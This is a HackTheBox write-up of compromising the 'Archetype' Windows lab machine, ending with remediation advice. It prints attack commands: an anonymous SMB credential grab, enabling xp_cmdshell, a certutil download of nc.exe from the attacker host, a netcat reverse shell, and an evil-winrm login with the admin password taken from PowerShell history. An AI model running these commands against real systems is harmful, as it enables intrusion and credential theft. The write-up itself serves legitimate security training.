# Target: Archetype
**Platform:** HackTheBox
[Archetype on HackTheBox](https://app.hackthebox.com/machines/Archetype)

| Target Name | IP Address | OS | Difficulty |
| :--- | :--- | :--- | :--- |
| Archetype | 10.129.95.187 | Windows | Very Easy |

---

## Phase 1: Reconnaissance & Enumeration

I started my reconnaissance by running a scan using Nmap to find which TCP ports were hosting a database server. I used the '-sV' flag to show the version of the program running on each port:

**Nmap Scan:**
```bash
nmap -sV -vv 10.129.95.187
```

```
Nmap scan report for 10.129.95.187
	Host is up, received reset ttl 127 (0.030s latency).
	Scanned at 2026-02-17 15:27:24 CET for 7s
	Not shown: 995 closed tcp ports (reset)
	PORT     STATE SERVICE      REASON          VERSION
	135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
	139/tcp  open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
	1433/tcp open  ms-sql-s     syn-ack ttl 127 Microsoft SQL Server 2017 14.00.1000
	5985/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

I noticed that port 1433 was open, so this allowed me to connect with the SQL Server. I checked the available shares on this machine using SMBClient. I used '-L' flag to show the list and '-N' to show directories without a password:

**SMB Enumeration:**
```bash
smbclient -N -L 10.129.95.187
```

```
Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
```

The directory named 'backups' seemed to be created by the administrator and not protected. I decided to check files in this directory. Once again I used SMBClient to check it. I connected with the machine:

**Connecting with Server**
```bash
smbclient //10.129.95.187/backups
```

After connecting to the server I checked for all the files and directories in the 'backups' directory:

```
smb: \> ls

```

```
	  .                                   D        0  Mon Jan 20 13:20:57 2020
	  ..                                  D        0  Mon Jan 20 13:20:57 2020
	  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

		        5056511 blocks of size 4096. 2543571 blocks available
```

I downloaded the file 'prod.dtsConfig' to my system to check what it contains. I used get command to download it:

**Downloading Configuration Files:**
```smb
get prod.dtsConfig
```
After that I quit the Server connection and read the file using cat command:

**Reading Configuration File:**
```bash
cat prod.dtsConfig  
```

```
<DTSConfiguration>
	    <DTSConfigurationHeading>
		<DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
	    </DTSConfigurationHeading>
	    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
		<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
	    </Configuration>
	</DTSConfiguration>
```

While that file downloaded and read, I successfully uncovered the username ('ARCHETYPE\sql_svc') and the password ('M3g4c0rp123').

## Phase 2: Initial Foothold (Gaining Access)

I searched for a tool to connect with the SQL Server, and I found Impacket's script named mssqlclient.py. I used it to login to the SQL using username, domain and password from the previous step, I added the flag '-windows-auth' to make sure the script knew that this was the Windows environment:
```bash
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth
```

The connection was successfull, because the prompt changed to:
```
SQL (ARCHETYPE\sql_svc  dbo@master)>
```
After connecting to the SQL Server I searched for a Microsoft SQL extended procedure to spawn Microsoft command shell, and I found the tool named xp_cmdshell.
The xp_cmdshell feature is disabled by default, so I had to enable it.
**Unlocking the Hidden Setting in xp_cmdshell:**
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

This allowed me to use this tool without any restrictions. Now I had to transfer the NetCat to this machine to connect with it.
I opened new terminal and started a Python server, in the directory containing the Netcat, to share this tool to the SQL Server:
**Setting Python Server:**
```bash
python3 -m http.server 80
```

Next, I opened another terminal and started Netcat on my Kali Linux to start listening for incoming connection:
**Starting Listening on Netcat:**
```bash
nc -lvnp 443
```

I left it running in the background and moved to the SQL Server to download the Netcat to the system. 
**Downloading Netcat from the Python Server:**
```sql
xp_cmdshell "certutil -urlcache -split -f http://<KALI_IP>/nc.exe C:\Users\Public\nc.exe"
```

Next I ran the Netcat on the SQL Server to establish a connection.
**Starting netcat on SQL Server:**
```sql
xp_cmdshell "C:\Users\Public\nc.exe -e cmd.exe <KALI_IP> 443"
```

After a while I switched to my Kali Linux machine, and checked the Netcat, which was listening, and there was a successfull connection with Windows.

## Phase 3: Privilege Escalation & Post-Exploitation

After getting into the system as a low privilege user, I looked for the users on this machine by checking users' folders.
**Checking for Users:**
```cmd
dir C:\Users
```

```
Directory of C:\Users

	01/19/2020  03:10 PM    <DIR>          .
	01/19/2020  03:10 PM    <DIR>          ..
	01/19/2020  10:39 PM    <DIR>          Administrator
	02/18/2026  01:12 AM    <DIR>          Public
	01/20/2020  05:01 AM    <DIR>          sql_svc
```

Next, I checked the contents of the sql_svc directory. I found the Desktop folder and listed its contents.
**Looking for Directories in the User's Desktop:**
```cmd
dir C:\Users\sql_svc\Desktop
```

```
Directory of C:\Users\sql_svc\Desktop

	01/20/2020  05:42 AM    <DIR>          .
	01/20/2020  05:42 AM    <DIR>          ..
	02/25/2020  06:37 AM                32 user.txt
```

I navigated to this directory and read the user.txt file.
**Moving to User's Desktop and Reading the File:**
```cmd
cd C:\Users\sql_svc\Desktop
type user.txt
```

```
3e7b102e78218e935bf3f4951fec21a3
```
While exploring the 'sql_svc' user's directories, I checked the PowerShell history files to see if the user had run any interesting commands recently.
**Reading PowerShell History:**
```cmd
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

This revealed the user had previously mapped a network drive and accidentally saved the Administrator password (MEGACORP_4dm1n!!) in plain text in their command history.
After getting the username and password to the admin account, I opened new terminal, and decided to connect with the machine using evil-winrm tool.
**Connecting with the Machine as Administrator:**
```bash
evil-winrm -i 10.129.95.187 -u Administrator -p 'MEGACORP_4dm1n!!'
```

After a while the connection was established, and I was in the 'C:\Users\Administrator\Documents' folder. I searched for the files there, but nothing appeared so I decided to go one step up and check the 'C:\Users\Administrator' folder.
**Looking for files in Administrator's folder:**
```cmd
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir C:\Users\Administrator
```

```
Directory: C:\Users\Administrator

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        7/27/2021   2:30 AM                3D Objects
d-r---        7/27/2021   2:30 AM                Contacts
d-r---        7/27/2021   2:30 AM                Desktop
d-r---        7/27/2021   2:30 AM                Documents
d-r---        7/27/2021   2:30 AM                Downloads
d-r---        7/27/2021   2:30 AM                Favorites
d-r---        7/27/2021   2:30 AM                Links
d-r---        7/27/2021   2:30 AM                Music
d-r---        7/27/2021   2:30 AM                Pictures
d-r---        7/27/2021   2:30 AM                Saved Games
d-r---        7/27/2021   2:30 AM                Searches
d-r---        7/27/2021   2:30 AM                Videos
```

I decided to check 'Desktop' folder.
**Checking for files in Desktop folder:**
```cmd
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir C:\Users\Administrator\Desktop
```

```
Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/25/2020   6:36 AM             32 root.txt
```

This was the file containing the flag so I read it.
**Reading the root flag:**
```cmd
cd C:\Users\Administrator\Desktop
type root.txt
```

```
b91ccec3305e98240082d4474b848528
```

## Conclusion & Takeaways


The compromise of the Archetype machine demonstrates how a chain of misconfigurations can lead to a complete system takeover. The initial foothold was achieved due to exposed credentials, and privilege escalation was possible because of unsafe administrative practices. 

To secure this server and prevent similar attacks, I recommend the following remediations:

1. **Secure SMB Shares and Credentials:** The `backups` SMB share allowed anonymous access and contained a configuration file (`prod.dtsConfig`) with cleartext database credentials. Anonymous access to sensitive shares should be disabled, and credentials should never be hardcoded in files.
2. **Disable SQL Server Extended Procedures:** The `xp_cmdshell` feature allowed for arbitrary remote code execution. This feature is disabled by default and should remain disabled unless absolutely necessary for business operations. Additionally, the SQL service account (`sql_svc`) should operate under the principle of least privilege to limit what an attacker can do if the database is compromised.
3. **Safe Credential Handling:** The Administrator password was found in plain text within the `sql_svc` user's PowerShell history file (`ConsoleHost_history.txt`). Administrators should avoid passing passwords directly in the command line. Instead, they should use secure credential prompts or password vaulting solutions, and regularly clear command history files on shared servers.
